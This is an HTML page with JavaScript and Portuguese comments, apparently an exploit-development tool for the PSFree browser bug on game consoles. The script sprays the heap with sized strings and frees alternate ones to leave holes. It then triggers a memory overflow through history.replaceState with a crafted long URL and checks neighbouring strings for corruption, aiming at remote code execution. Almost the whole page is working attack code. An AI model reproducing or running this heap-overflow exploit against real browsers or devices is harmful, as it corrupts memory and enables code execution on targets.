<!DOCTYPE html>
<html>
<head>
    <title>PSFree Size Class Finder</title>
    <style>
        body { background-color: #050505; color: #00ff00; font-family: monospace; padding: 20px; }
        button { 
            font-size: 22px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-bottom: 15px;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; }
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.4em; padding: 10px; }
    </style>
</head>
<body>

    <h1>Size Class Finder</h1>
    <p>Descobrindo o menor tamanho que ativa o bug para facilitar o RCE.</p>

    <button onclick="runTest(65536)">TESTAR 64 KB</button>
    <button onclick="runTest(32768)">TESTAR 32 KB</button>
    <button onclick="runTest(16384)">TESTAR 16 KB</button>
    
    <div id="log">Pronto. Reinicie o console antes de cada teste.</div>

    <script>
        // CONFIGURAÇÕES
        // Overflow proporcional ao tamanho (metade do tamanho do objeto)
        // Isso evita destruir o heap inteiro
        let current_overflow_amt = 0;

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function runTest(sizeBytes) {
            let sizeKB = sizeBytes / 1024;
            log(`----------------------------------------`);
            log(`INICIANDO TESTE: CLASSE ${sizeKB} KB`);
            
            // 1. Calcular Offset Base
            // Assumimos que o "Header" da String é ~24 bytes.
            // Se queremos encher um bloco de 64KB, nossa string tem que ter (64KB - 24).
            const PAYLOAD_SIZE = sizeBytes - 24;
            
            // O Offset de disparo deve ser exatamente o tamanho do payload
            // para começar a escrever no vizinho.
            const SHOOT_OFFSET = PAYLOAD_SIZE;
            
            // Ajusta o overflow para ser seguro (50% do tamanho do bloco)
            current_overflow_amt = sizeBytes / 2;

            log(`Payload Alvo: ${PAYLOAD_SIZE} bytes`);
            log(`Offset de Tiro Estimado: ${SHOOT_OFFSET}`);
            log(`Overflow: ${current_overflow_amt} bytes`);

            // 2. Preparar Vítimas (TextDecoder 8-bit)
            victims = [];
            await forceGC();

            try {
                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                rawBuffer.fill(0x42); // 'B'
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                // Spray mais denso porque os objetos são menores
                const SPRAY_COUNT = 200; 
                
                log(`Alocando ${SPRAY_COUNT} strings de ${sizeKB} KB...`);
                for(let i=0; i<SPRAY_COUNT; i++) {
                    // Prefixo curto para não alterar muito o tamanho
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // 3. Buracos
                log("Criando buracos...");
                for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
                
                await forceGC();

                // 4. Exploit
                log("Disparando Overflow...");
                setTimeout(() => {
                    try {
                        // Monta o ataque
                        let buffer = "A".repeat(SHOOT_OFFSET);
                        // Adiciona o bypass 0x01
                        buffer += "\x01".repeat(current_overflow_amt);
                        
                        history.replaceState({}, "size_test", "/" + buffer);

                        checkResults(PAYLOAD_SIZE);

                    } catch (e) {
                        log("Erro: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro Memória: " + e.message);
            }
        }

        function checkResults(expectedLen) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO 1: LENGTH
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido na Vítima ${i}!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert(`RCE POSSÍVEL COM ${expectedLen + 24} BYTES!`);
                        success = true;
                        break;
                    }

                    // SUCESSO 2: DADOS
                    if (msg.charCodeAt(0) === 1) {
                        log(`[SUCESSO PARCIAL] Dados corrompidos com tamanho ${expectedLen + 24}.`, 'win');
                        log(`O alinhamento está correto. Falta ajustar para pegar o Header.`);
                        success = true;
                        break;
                    }
                } catch(e) {}
            }
            if(!success) log("Nada atingido. Tente outro tamanho ou reinicie.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 500));
        }
    </script>
</body>
</html>
